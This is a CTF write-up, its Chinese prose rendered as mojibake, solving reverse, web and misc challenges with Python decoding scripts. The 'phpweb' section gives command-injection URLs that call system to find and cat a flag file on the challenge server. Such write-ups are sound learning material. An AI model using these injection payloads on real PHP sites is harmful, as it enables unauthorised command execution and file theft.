[TOC]

# 2020_��������ȸ��writeup

## reverse 0x1 go

����ؼ����Ƿ���base64���ܱ�

1.      ��������go���Ա�д��ͨ�����ܸ����key�õ�flag
![2020_��������ȸ��writeup.md4](2020_��������ȸ��writeup.md4.png)

2.      �޸�base64����ٰ������key����base64
![2020_��������ȸ��writeup.md3](2020_��������ȸ��writeup.md5.png)

3.      Ȼ������ܵ�key���Ƚϣ������ȷ�ͻ�������key��������flag��keyȥ�Խ���
 ![2020_��������ȸ��writeup.md2](2020_��������ȸ��writeup.md6.png)

4 �޸����ֻ�ܵõ�����key��ǰ15λ�����һλҪ�Զ�����

key: `nRKKAHzMrQzaqQzKpPHClX`

������ʾ���Ȳ��ԡ�

5 ������ʽ�������1Xû�н���

6 �����뷢�ֻ���һ���Ƚϼ���base64���ұ��Ƿ���==�Ĳ���

![2020_��������ȸ��writeup.md1](2020_��������ȸ��writeup.md7.png)

7 ���ǰ�key������������==Ȼ����ȥ����һ�εõ���ȷ��key

8 ����key��Ȼ�����ͻ��Զ���ӡ��flag



```python
c = 'cbdb2c89f6800e6c93e1c1e541e1a89758f45fd988c6652fa955db2f00290da27' # ���ܺ��flag
# base64 �Զ���仯���
import base64
# ֱ���� nRKKAHzMrQzaqQzKpPHClX ��û��������ʾ���Ȳ��ԣ�����=�����ԡ��ɹ��ˡ�
cipher = 'nRKKAHzMrQzaqQzKpPHClX=='
my_base64chars = 'XYZFGHI2+/Jhi345jklmEnopuvwqrABCDKL6789abMNWcdefgstOPQRSTUVxyz01'
STD_BASE64CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
# base64chars = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'
cipher = cipher.translate(str.maketrans(my_base64chars, STD_BASE64CHARS))
data = base64.b64decode(cipher)
print(data)
# What_is_go_a_A_H
# �û�ȥ����key��flag�ˡ�
```

## reverse 0x2 tree

https://www.52pojie.cn/thread-1181476-1-1.html

�򿪳����ҵ�main����

![what1](2020_��������ȸ��writeup.md1.png)


���뵽chkflag�������������ǽ������flag�е�xxxÿһ��x������2���Ƶ���ʽ��ÿһ��4λ��Ȼ�����glockflag��

![2020_��������ȸ��writeup.md2](2020_��������ȸ��writeup.md2.png)

parse�����ǽ�glockflag�еĶ������ó�����0������1�����ң���ʼ����Ҷ�ӽڵ㣬����ҵ���Ҷ�ӽڵ���zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx������ȷ

![2020_��������ȸ��writeup.md3](2020_��������ȸ��writeup.md3.png)

�����Ƚ� ÿ���ڵ㼰��·����ӡ����

```python
def traverse_leaf(pnode):
    if pnode != 0:
        if Dword(pnode + 12) == 0 and Dword(pnode + 16) == 0:
            print(chr(Byte(pnode)))
            print("".join(a))
            lujing.append([chr(Byte(pnode)), "".join(a)])
        a.append('0')
        traverse_leaf(Dword(pnode + 12))
        a.append('1')
        traverse_leaf(Dword(pnode + 16))
    if pnode != 0X0406530:
        a.pop()


traverse_leaf(0X0406530)
print(lujing)
```

>[['y', '0000'], ['b', '00010'], ['q', '00011'], ['g', '0010'], ['f', '0011'], ['j', '010'], ['w', '01100'], ['p', '01101'], ['x', '011100'], ['d', '0111010'], ['i', '0111011'], ['k', '01111'], ['s', '100'], ['z', '1010'], ['n', '1011'], ['c', '11000'], ['t', '110010'], ['e', '110011'], ['h', '1101'], ['o', '11100'], ['l', '1110100'], ['u', '11101010'], ['r', '111010110'], ['a', '111010111'], ['m', '111011'], ['v', '1111']]

Ȼ���ڿ�ʼд�ű����� zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx ת��·����Ȼ��ƴ������4λ4λ�ķֿ�����flag�е�xxxx

```python
lujing = [['y', '0000'], ['b', '00010'], ['q', '00011'], ['g', '0010'], ['f', '0011'], ['j', '010'], ['w', '01100'], ['p', '01101'], ['x', '011100'], ['d', '0111010'], ['i', '0111011'], ['k', '01111'], ['s', '100'], ['z', '1010'], ['n', '1011'], ['c', '11000'], ['t', '110010'], ['e', '110011'], ['h', '1101'], ['o', '11100'], ['l', '1110100'], ['u', '11101010'], ['r', '111010110'], ['a', '111010111'], ['m', '111011'], ['v', '1111']]
res = "zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx"
flag01 = ""
flagx = ""
for i in res:
    for j in lujing:
        if i in j[0]:
            flag01 += j[1]
print(flag01)
for i in range(0, len(flag01), 4):
    tmp = "%x" % int(flag01[i:i+4], 2)
    flagx += tmp
print(flagx)
```

���մ�ӡ��flagx��afa41fc8574f12481a849d7f7120f89c

��flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}�滻������

flagΪflag{afa41fc8-574f-1248-1a84-9d7f7120f89c}

��Ŀ�����ӣ�https://pan.baidu.com/s/1RUPL9W2119cJ8TDVf2m-8Q

��ȡ�룺sca9

## web 0x2 phpweb

��Դ��, ���ύfunc��p, ��value��֪func�Ǻ�����, p �ǲ�����

func=file_get_contents&p=index.php��Դ�롣

�����˳��ÿ�system�ȣ�ͨ����\����

1.����flagλ��

`http://xxx.ichunqiu.com/index.php?func=\system&p=find / -name flag*`

2.��flag����

`http://xxx.ichunqiu.com/index.php?func=\system&p=cat /tmp/flagoefiu4r93`

## misc 0x2 �Ź���

���ݶ�ά��ʶ����������ַ�����һ��576λ��576λת����TEXT�ı�����Ŀ��ʾ�ľŹ���ƴ����������245568������rabbit���ܣ���ǰ���TEXT�ı����н��ܣ������·�����245568.���ɵõ�����flag



```python
from pathlib import Path
from PIL import Image
from pyzbar.pyzbar import decode


f = b''
for i in sorted(Path('.').rglob('*.png'), key=lambda x: x.stem.rjust(5, '0')):
    data = decode(Image.open(i))
    data = data[0].data
    data = b'1' if data == b'one' else b'0'
    f += data
# '010101010011001001000110011100110110010001000111010101100110101101011000001100010011100101101010010101000110100001111000010101110111000101001011011011010101100101010100010110100101000000110001010110000011010001000001011001100111010101000110010010100010111100110111010001100110110001110001010010010100011000110001010010110100100001010001010101000101001000110101010100110011011000110011011110100100111101101011011110010110111101011000001100110011011001101110010110100110110001100001010011110111000100110100010110000011010001101011011011000111011101010010011101110111000101100001'

a = f.decode()
b = bytearray.fromhex(hex(int(a, 2))[2:])
print(b)

# U2FsdGVkX19jThxWqKmYTZP1X4AfuFJ/7FlqIF1KHQTR5S63zOkyoX36nZlaOq4X4klwRwqa
```
key �� 245568��

�Ҹ����ߵĽ���һ�¡�

`flag{2c4fdc156fe74836954a05058c5d0382}`


## misc 0x4 key_123

��ѹ����123  Ȼ��Կ��ͼƬ�ĸ߶�  ��ͼƬbinwalk�ֳ���һ��ѹ������
Ȼ����ǿ�Կ��ͼƬ�ϵı�����--�������˹��
```
295965569a596696995a9aa969996a6a9a6699656569699
96959669566a5655699669aa5656966a566a56656
```
[����˹����������˹��](https://skysec.top/2017/07/10/����˹����������˹��/)  ?
